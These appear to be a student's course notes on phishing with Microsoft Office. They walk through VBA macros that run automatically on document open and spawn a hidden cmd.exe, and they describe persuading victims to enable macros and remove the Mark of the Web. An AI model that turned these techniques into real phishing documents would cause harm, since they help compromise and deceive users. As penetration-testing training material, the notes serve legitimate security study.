# 3.1.2. Phishing with Microsoft Office
 > #osep #phishing

 ----------
 - creating first macro
 ![[Pasted image 20250602195544.png]]

![[Pasted image 20250602195732.png]]
we'll name the macro `test` and then select `create`.
![[Pasted image 20250602200033.png]]
- the `editor` inserted a small starting code segment. in this code segment, `sub mymacro` defines the beginning of a `mymacro` method and `end sub` ends the method. note that in `vba`, a method cannot return values to its caller, but a `function` (bracketed with keywords like `function mymacro` and `end function`) can.
- as with many other languages, vba requires that we declare variables before we use them. we can do this with the `dim`, supplying the name of the variable and its `datatype`

```
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```
-  we used three very common data types: `String`, `Long`, and `LongPtr`. These data types directly translate to a `Unicode` string, a `64-bit integer`, and a memory pointer, respectively. these represent the operating system's native data types and are commonly used in languages such as `C` or `C++`.
-  below, we'll have our macro check the value of a variable and based on the result, display the appropriate `built-in` function.
```
Sub MyMacro()

Dim myLong As Long

myLong = 1

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```

this macro will display a "true" message box since the `mylong` variable is less than five.
![[Pasted image 20250602201059.png]]
- The `For` loop will read the `counter` three times and each time it reaches the `Next` keyword, it will increment the value of `counter` by one. The execution of this macro will present three `Alert` message boxes.
```
Sub MyMacro()

For counter = 1 To 3
    MsgBox ("Alert")
Next counter

End Sub
```
- let's turn our attention to our ultimate goal: `making the victim execute our custom macro`. since our victim will likely not do this willingly, we'll need to leverage existing methods like `Document_Open()`and `AutoOpen()`, both of which will execute when the Word document is opened.

**VBA implementations may vary across the various Office applications. For example, _Document_Open()_ is called _Workbook_Open()_ in Excel.**
- to use these methods, we must save our document in a `macro-enabled file format`such as `.doc`or `docm`the newer `.docx` file format does not support macros.
- let's test this with a simple macro that uses both `Document_Open` and `AutoOpen` for redundancy.
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
End Sub
```
- we'll save the document in the legacy `.doc` format (also referred to as a `word 97-2003 document`) and close it.
- now that we've saved the document, let's open it again. this presents a security warning banner instead of our message box output:
![[Pasted image 20250602202105.png]]
- if we click `enable content`, the macro will execute and the message box will appear. this is the default security setting for any office application. when we launch this client-side attack, we must somehow persuade the victim to both open the document and enable the macro.
- we can inspect these security settings by navigating to `_file_ > options`
![[Pasted image 20250602202330.png]]
![[Pasted image 20250602202343.png]]
- The`Protected View` options describe a sandbox feature introduced in `Microsoft Office 2010` that is enabled when documents originate from the internet.
![[Pasted image 20250602202548.png]]

-  macros will be disabled in all documents opened with `office 2021` (and newer) and `office 365` when they are downloaded from the internet. this means that even if we somehow manage to convince the victim to click `enable editing`, the `macros still won't execute`.
-  however, attackers can still trick the user into allowing macros to run. one approach is to make the office document appear as if it were not downloaded from the internet
-  office uses the `Mark of the Web (MoTW)` attribute to detect if a document originates from the internet. this is set when a document is downloaded from the internet. we can view the motw attribute by inspecting the word document's properties:
![[Pasted image 20250602202739.png]]
- if we check `unblock` and click `apply`, the `motw` attribute is unset and the word document would be treated as a locally-created file. this disables protected view and allows macros to run.this requires attackers to provide a convincing pretext to trick the user into unblocking the document and remove the `mark of the web` before opening the document. before wrapping up this section, let's show how to launch an external command, like `cmd.exe`, from `vba`. this will serve as a foundation for other techniques we will use in the rest of the course.

-  the first and simplest technique leverages the vba `shell`function, which takes two arguments. the `first` argument is the path and name of the application to launch along with any arguments. the `second` is the `windowstyle`, which sets the program's window style. most attackers set this to `vbhide` (or its numerical equivalent `0`), which hides the program's window.
- this code will launch a `command prompt` in a `hidden window` after the victim enables macros:
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```
- changed this so it would run upon opening
![[Pasted image 20250602203522.png]]
- and it ran
![[Pasted image 20250602203446.png]]
We can also use `Windows Script Host` to launch a shell. To do this, we'll invoke the `CreateObject` method to create a WSH shell, and from there we can call the `Run` method. While this might sound complicated, the code is relatively simple:
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```
- in this code, the call to `CreateObject` returns the `WSH` object, from which we invoke the `Run` method, supplying the path and name of the application to execute along with the `vbHide` window style (0). Executing the Macro will once again open `cmd.exe` as a hidden process, which we can again verify with `Process Explorer`.

![[Pasted image 20250602204239.png]]

#### Exercises

#### 1. 
![[Pasted image 20250623172559.png]]

```bash
Sub MyMacro()

Dim value As Long
Dim result As Long

value = 5
result = 7

For counter = 1 To value
    result = result + value + 32
Next counterr

If result < 180 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```
upon submitting this into my `macro` and hitting `run` i get an `error` due to `counterr` having 2 `r`'s
![[Pasted image 20250623172753.png]]
in order to fix this i took out one `r` and it worked
![[Pasted image 20250623172820.png]]
answer = false
![[Pasted image 20250623172850.png]]

---------

#### 2.
![[Pasted image 20250623173339.png]]
chatgpt created macro 
```bash
Sub ShowUserAndComputer()
    Dim user As String
    Dim computer As String
    Dim result As String

    user = Environ("USERNAME")
    computer = Environ("COMPUTERNAME")
    result = user & " || " & computer

    MsgBox result, vbInformation, "User & Computer Info"
End Sub
```
it running
![[Pasted image 20250623173401.png]]
profit
![[Pasted image 20250623173437.png]]

-------
#### 3.
![[Pasted image 20250623182719.png]]
```bash
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub



Sub MyMacro()
    MsgBox ("ThisIsReallyGood")
End Sub
```

![[Pasted image 20250623182815.png]]